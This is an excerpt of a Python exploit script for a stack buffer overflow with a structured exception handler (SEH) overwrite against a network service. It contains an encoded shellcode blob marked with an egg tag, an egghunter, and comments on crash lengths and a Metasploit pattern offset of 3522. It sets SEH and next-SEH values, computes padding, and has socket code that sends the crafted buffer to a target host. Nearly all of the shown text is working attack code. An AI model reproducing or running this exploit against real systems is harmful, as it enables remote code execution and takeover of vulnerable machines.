...
shell =  "T00WT00W"
shell += "\xba\xef\xb5\xa1\xba\xdd\xc0\xd9\x74\x24\xf4\x5d\x2b"
shell += "\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x02\x49\x43"
shell += "\x4f\x20\x5a\x06\xb0\xd8\x9b\x67\x38\x3d\xaa\xa7\x5e"
shell += "\x36\x9d\x17\x14\x1a\x12\xd3\x78\x8e\xa1\x91\x54\xa1"
shell += "\x02\x1f\x83\x8c\x93\x0c\xf7\x8f\x17\x4f\x24\x6f\x29"
shell += "\x80\x39\x6e\x6e\xfd\xb0\x22\x27\x89\x67\xd2\x4c\xc7"
shell += "\xbb\x59\x1e\xc9\xbb\xbe\xd7\xe8\xea\x11\x63\xb3\x2c"
shell += "\x90\xa0\xcf\x64\x8a\xa5\xea\x3f\x21\x1d\x80\xc1\xe3"
shell += "\x6f\x69\x6d\xca\x5f\x98\x6f\x0b\x67\x43\x1a\x65\x9b"
shell += "\xfe\x1d\xb2\xe1\x24\xab\x20\x41\xae\x0b\x8c\x73\x63"
shell += "\xcd\x47\x7f\xc8\x99\x0f\x9c\xcf\x4e\x24\x98\x44\x71"
shell += "\xea\x28\x1e\x56\x2e\x70\xc4\xf7\x77\xdc\xab\x08\x67"
shell += "\xbf\x14\xad\xec\x52\x40\xdc\xaf\x3a\xa5\xed\x4f\xbb"
shell += "\xa1\x66\x3c\x89\x6e\xdd\xaa\xa1\xe7\xfb\x2d\xc5\xdd"
shell += "\xbc\xa1\x38\xde\xbc\xe8\xfe\x8a\xec\x82\xd7\xb2\x66"
shell += "\x52\xd7\x66\x28\x02\x77\xd9\x89\xf2\x37\x89\x61\x18"
shell += "\xb8\xf6\x92\x23\x12\x9f\x39\xde\xf5\x60\x15\x86\x30"
shell += "\x09\x64\x46\x3a\x72\xe1\xa0\x56\x94\xa4\x7b\xcf\x0d"
shell += "\xed\xf7\x6e\xd1\x3b\x72\xb0\x59\xc8\x83\x7f\xaa\xa5"
shell += "\x97\xe8\x5a\xf0\xc5\xbf\x65\x2e\x61\x23\xf7\xb5\x71"
shell += "\x2a\xe4\x61\x26\x7b\xda\x7b\xa2\x91\x45\xd2\xd0\x6b"
shell += "\x13\x1d\x50\xb0\xe0\xa0\x59\x35\x5c\x87\x49\x83\x5d"
shell += "\x83\x3d\x5b\x08\x5d\xeb\x1d\xe2\x2f\x45\xf4\x59\xe6"
shell += "\x01\x81\x91\x39\x57\x8e\xff\xcf\xb7\x3f\x56\x96\xc8"
shell += "\xf0\x3e\x1e\xb1\xec\xde\xe1\x68\xb5\xef\xab\x30\x9c"
shell += "\x67\x72\xa1\x9c\xe5\x85\x1c\xe2\x13\x06\x94\x9b\xe7"
shell += "\x16\xdd\x9e\xac\x90\x0e\xd3\xbd\x74\x30\x40\xbd\x5c"
...
muha=pre+pattern+"\x41"*(4100-len(pattern))+end
#muha=pre+pattern+end
#***********************************************
#4100,4200,5000 bytes: SEH overwrite
#3500: NO CRASH
#************************************************
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 45346e45
#[*] Exact match at offset 3522
#625010B4
seh="\xb4\x10\x50\x62" 
#jump 80 backwards
nseh="\x71\x80\x70\xf0"
filler="\x43" * (4100-3522-len(seh)-len(end)-len(pre)-len(nseh))
muha=pre+shell+"\x90"*(3522-4-len(egghunter)-len(shell))+egghunter+nseh+seh+filler+end
s.connect((host,port))
s.recv(1024)
s.send(muha)
s.close()
